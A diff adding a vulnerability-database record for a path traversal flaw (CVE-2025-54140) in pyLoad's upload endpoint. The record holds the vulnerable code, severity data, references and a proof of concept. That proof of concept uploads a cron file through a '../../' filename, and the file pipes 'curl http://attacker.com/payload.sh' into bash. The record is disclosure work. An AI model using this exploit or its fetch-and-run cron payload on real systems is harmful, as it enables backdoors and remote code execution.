@@ -1,0 +1,85 @@
+advisory_id: GHSA-xqpg-92fq-grfg
+datasource_id: github_osv/GHSA-xqpg-92fq-grfg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-xqpg-92fq-grfg/GHSA-xqpg-92fq-grfg.json
+aliases:
+  - CVE-2025-54140
+summary: "`pyLoad` has Path Traversal Vulnerability in `json/upload` Endpoint that allows Arbitrary\
+  \ File Write\n## Summary\nAn **authenticated path traversal vulnerability** exists in the\
+  \ `/json/upload` endpoint of the `pyLoad` By **manipulating the filename of an uploaded file**,\
+  \ an attacker can traverse out of the intended upload directory, allowing them to **write\
+  \ arbitrary files to any location** on the system accessible to the pyLoad process. This may\
+  \ lead to:\n\n* **Remote Code Execution (RCE)**\n* **Local Privilege Escalation**\n* **System-wide\
+  \ compromise**\n* **Persistence and backdoors**\n\n---\n\n### Vulnerable Code\n\nFile: [`src/pyload/webui/app/blueprints/json_blueprint.py`](https://github.com/pyload/pyload/blob/df094db67ec6e25294a9ac0ddb4375fd7fb9ba00/src/pyload/webui/app/blueprints/json_blueprint.py#L109)\n\
+  \n```python\n@json_blueprint.route(\"/upload\", methods=[\"POST\"])\ndef upload():\n    dir_path\
+  \ = api.get_config_value(\"general\", \"storage_folder\")\n    for file in request.files.getlist(\"\
+  file\"):\n        file_path = os.path.join(dir_path, \"tmp_\" + file.filename)  \n       \
+  \ file.save(file_path) \n```\n**Issue**: No sanitization or validation on `file.filename`,\
+  \ allowing traversal via `../../` sequences.\n\n\n\n\n### (Proof of Concept)\n\n1. **Clone\
+  \ and install pyLoad from source** (`pip install pyload-ng`):\n\n```bash\ngit clone https://github.com/pyload/pyload\n\
+  cd pyload\ngit checkout 0.4.20\npython -m pip install -e .\npyload --userdir=/tmp/pyload\n\
+  ```\n\n2. **Or install via pip (PyPi) in virtualenv:**\n\n```bash\npython -m venv pyload-env\n\
+  source pyload-env/bin/activate\npip install pyload==0.4.20\npyload\n```\n\n\n1. **Login and\
+  \ obtain session token**\n```bash\ncurl -c cookies.txt -X POST http://127.0.0.1:8000/login\
+  \ \\\n  -d \"username=admin&password=admin\"\n```\n\n2. **Create malicious cron payload**\n\
+  ```bash\necho \"*/1 * * * * root curl http://attacker.com/payload.sh | bash\" > exploit\n\
+  ```\n\n3. **Upload file with path traversal filename**\n```bash\ncurl -b cookies.txt -X POST\
+  \ http://127.0.0.1:8000/json/upload \\\n  -F \"file=@exploit;filename=../../../../etc/cron.d/pyload_backdoor\"\
+  \n```\n\n4. On the next cron tick, a reverse shell or payload will be triggered.\n\n### BurpSuite\
+  \ HTTP Request\n\n```\nPOST /json/upload HTTP/1.1\nHost: 127.0.0.1:8000\nCookie: session=SESSION_ID_HERE\n\
+  Content-Type: multipart/form-data; boundary=------------------------d74496d66958873e\n\n--------------------------d74496d66958873e\n\
+  Content-Disposition: form-data; name=\"file\"; filename=\"../../../../etc/cron.d/pyload_backdoor\"\
+  \nContent-Type: application/octet-stream\n\n*/1 * * * * root curl http://attacker.com/payload.sh\
+  \ | bash\n--------------------------d74496d66958873e--\n```"
+impacted_packages:
+  - purl: pkg:pypi/pyload-ng
+    affected_versions: vers:pypi/0.5.0b3.dev89
+    fixed_versions: vers:pypi/0.5.0b3.dev90
+    affected_packages:
+      - pkg:pypi/pyload-ng@0.5.0b3.dev89
+    fixed_packages:
+      - pkg:pypi/pyload-ng@0.5.0b3.dev90
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/pyload/pyload
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/pyload/pyload
+        commit: fc4b136e9c4e7dcbb8e467ae802cb2c3f70a71b0
+        patch_text:
+      - vcs_url: https://github.com/pyload/pyload
+        commit: df094db67ec6e25294a9ac0ddb4375fd7fb9ba00
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-xqpg-92fq-grfg/GHSA-xqpg-92fq-grfg.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/pyload/pyload
+    reference_type:
+    reference_id:
+  - url: https://github.com/pyload/pyload/blob/df094db67ec6e25294a9ac0ddb4375fd7fb9ba00/src/pyload/webui/app/blueprints/json_blueprint.py#L109
+    reference_type:
+    reference_id:
+  - url: https://github.com/pyload/pyload/commit/fc4b136e9c4e7dcbb8e467ae802cb2c3f70a71b0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-54140
+    reference_type:
+    reference_id: CVE-2025-54140
+  - url: https://github.com/pyload/pyload/security/advisories/GHSA-xqpg-92fq-grfg
+    reference_type:
+    reference_id: GHSA-xqpg-92fq-grfg
+exploits: []
